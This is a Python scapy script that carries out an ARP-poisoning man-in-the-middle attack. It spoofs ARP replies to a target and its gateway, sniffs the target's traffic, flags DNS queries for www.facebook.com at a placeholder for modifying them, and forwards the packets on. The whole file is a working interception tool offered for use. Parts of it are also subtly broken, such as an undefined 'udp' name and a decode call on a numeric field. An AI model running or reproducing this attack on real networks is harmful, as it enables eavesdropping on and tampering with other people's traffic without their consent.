from scapy.all import *
from collections import deque
import threading
import time

in_packets = deque([])
out_packets = deque([])

def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket)[0][0][1].hwsrc
    return targetmac

def poisonarpcache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet)
    print ("ARP Table restored to normal for", targetip)

def arppoison(targetip, gatewayip):

    try:
        targetmac = getmac(targetip)
    except:
        print("Target machine did not respond to ARP broadcast")
        quit()

    try:
        gatewaymac= getmac(gatewayip)
    except:
        print("Gateway is unreachable")
        quit()

    try:
        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5)
            poisonarpcache(targetip, targetmac, gatewayip)
            poisonarpcache(gatewayip, gatewaymac, targetip)

    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

def sniffing(targetip):
    global pacotes
    sniff(filter = f'host {targetip}',prn = lambda x:in_packets.append(x))

def checking(targetip,gatewayip):
    while(True):
        try:
            i = in_packets.popleft()
            if (i[IP].proto.decode('UTF-8') == udp):
                if(i[DNSQR].qname.decode('UTF-8') == "www.facebook.com."):
                    ##modify
                    i.show()
                    out_packets.append(i)
                else:
                    out_packets.append(i)
            else:
                out_packets.append(i)
        except Exception:
            continue

def forwarding ():
    while(True):
        try:
            i = out_packets.popleft()
            i.show()
            send(i)
        except Exception:
            continue

def main():
    
    targetip = input("Enter Target IP:").rstrip()
    gatewayip = input("Enter Gateway IP:").rstrip()
    
    try:   
        arp_poison = threading.Thread(target=arppoison, args=(targetip, gatewayip))
        sniff = threading.Thread(target=sniffing, args = (targetip,))
        check = threading.Thread(target=checking, args=(targetip, gatewayip))
        forward = threading.Thread(target=forwarding)

        arp_poison.start()
        sniff.start()
        check.start()
        forward.start()
        
    except KeyboardInterrupt:
        arp_poison.join()
        sniff.join()
        check.join()
        forward.join()

if __name__ == "__main__":
    main()
